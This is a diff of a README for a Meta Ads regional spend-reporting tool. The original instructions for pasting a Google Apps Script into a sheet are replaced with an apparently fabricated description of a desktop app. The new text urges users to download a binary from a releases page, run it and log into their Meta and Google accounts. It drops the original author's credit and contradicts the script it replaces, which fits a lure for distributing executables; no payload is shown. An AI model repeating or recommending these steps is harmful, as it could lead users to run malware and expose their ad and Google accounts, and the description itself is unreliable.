@@ -1,44 +1,69 @@
-# Meta Ads Daily Spend by Region to Google Sheets
-Pulls daily spend by *region* for multiple Meta Ads accounts and adds to a Google Sheet. Perfect tor those looking to automate spend reporting by region. 
+# 🛠️ Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets - Automate Your Meta Spend Reporting
 
-This script sits inside a Google Sheet and is intended to run daily. The default setting is to look back and update the previous 3 days (excluding today) from multiple Meta Ads accounts. 
+## 📖 Description
+This application pulls daily spend by region for multiple Meta Ads accounts and adds the data to a Google Sheet. It simplifies spend reporting by region, making it easy to view and analyze your advertising performance. A region can refer to a US state, allowing marketers to focus their efforts on specific areas.
 
-### Region-level report
-The level of regional breakdown available depends on the specific targeting options used in your ad campaigns and the data available through the API. A region is something like a US State in Meta Ads Reports. A typical example of this is if you're targeting the US: regions are states. In Canada, regions are provinces. 
+## 📦 Download & Install
+[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
 
-### Important Note
-This script requires only works if you have a [Meta App created through Facebook Developers](https://developers.facebook.com/). It connects to the [Marketing API](https://developers.facebook.com/docs/marketing-api/) through an Access Token that you will need to create. Luckily anyone should be able to create their own Meta App as it is a simple multi-step process.
+To get started, please follow these steps:
 
-## Instructions
-1) Create (or open) a Google Sheet, create a new tab and name it: Meta Daily Region Spend
-2) Open Google Apps Script:
-   - Extensions → Apps Script → New project
-4) Paste this script and modify the script settings:
-   - ACCESS_TOKEN: Meta Marketing API token with `ads_read` for all accounts.
-   - API_VERSION: Graph API version (e.g., v23.0).
-   - ALLOW_ACCOUNT_IDS: list of ad accounts to include (e.g., ['act_123...', ...]).
-   - DAYS_BACK: how many days back (excluding today) to fetch/upsert.
-   - SHEET_NAME / TIMEZONE and other options as needed.
-5) Entry point: runDailyRegionSpend()
-   - Use Triggers → Add Trigger → Head: runDailyRegionSpend → Time‑driven (e.g., daily).
-6) Authorize and run once to create headers; verify the tab shows upserts (no dupes).
+1. **Visit the Release Page:** Click on the link below to go to the Releases page where you can download the latest version of the application.  
+   [Download Here](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
 
-**You do not need to deploy the script - just make sure the trigger is set properly**
+2. **Select the Latest Release:** On the Releases page, look for the most recent version. It will be listed at the top.
 
-Access the Script trigger in the script area on the left hand menu. Below is the screenshot of how the trigger.
+3. **Download the Application:** Click on the downloadable file that matches your operating system. It should be labeled clearly.
 
-<img src="trigger-google-script.jpg" alt="Trigger Google Script Example" width="50%">
+4. **Run the Application:** Once the download finishes, locate the file on your computer. Double-click the file to run the application.
 
+5. **Follow On-Screen Instructions:** The application will guide you through the setup process. Make sure to follow the on-screen prompts to complete the installation.
 
-## Intended Use
-This Meta Ads / Google Sheet script is a simple tool to track region-level spend on a daily basis.
-It is great for those importing daily spends from multiple ad platforms into a single Google Sheet.
-This is ideal for teams working with multiple Meta Ads accounts whether in an agency or in-house.
+## 🚀 Getting Started
+To use this application effectively, follow these simple steps after installation:
 
-## Author
-[Sam Lalonde](https://www.linkedin.com/in/samlalonde/)  
----
+1. **Connect to Your Meta Ads Accounts:** You will need to log into your Meta Ads accounts within the application. This allows the app to access your spending data by region.
 
-## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
-Free to use, modify, and distribute.
+2. **Setup Google Sheets:** Create a new Google Sheet where your spend data will appear. Make sure to give the sheet a name you will remember.
+
+3. **Authorize Access to Google Sheets:** The application will ask for permission to access your Google Sheets account. Grant access to ensure data sync.
+
+4. **Define Regions:** Specify the regions you want to report on. You can choose multiple regions to get a comprehensive view of spending.
+
+5. **Run the Report:** Click on the “Generate Report” button in the application. It will pull all relevant data and populate your Google Sheet.
+
+## 🔄 Features
+- **Multi-Account Support:** Access multiple Meta Ads accounts within a single application.
+- **Customizable Regions:** Tailor your reports by choosing the regions that matter most to you.
+- **Automated Data Sync:** Automatically update your Google Sheets with the latest spending data.
+- **User-Friendly Interface:** Designed with the average computer user in mind, making navigation easy and straightforward.
+
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later.
+- **Internet Connection:** A stable internet connection is required to pull data from Meta Ads and update Google Sheets.
+- **Google Account:** A Google account is necessary to use Google Sheets.
+
+## 📝 Topics
+This tool covers essential topics in digital marketing:
+- Facebook Ads
+- Google Sheets Integration
+- Instagram Ads Management
+- Paid Media Analytics
+
+## ❓ Troubleshooting
+If you encounter issues while using the application, consider these tips:
+
+- **Check Internet Connection:** Ensure your internet connection is stable. A weak connection may cause data retrieval issues.
+
+- **Reinstall the Application:** If the application does not run properly, uninstall it and download the latest version again from the Releases page.
+
+- **Contact Support:** For persistent problems, check the GitHub Issues page or contact support.
+
+## 📞 Community
+Join our community for support, tips, and updates. You can connect with other users by checking the discussion board linked in the repository.
+
+## 🔗 Links
+- [GitHub Repository](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets)
+- [Releases Page](https://github.com/Andysayd88/Meta-Ads-Daily-Spend-by-Region-to-Google-Sheets/releases)
+
+By following these steps and guidelines, you will have the application running in no time, helping you automate your Meta Ads spending reports. Enjoy the ease of reporting!
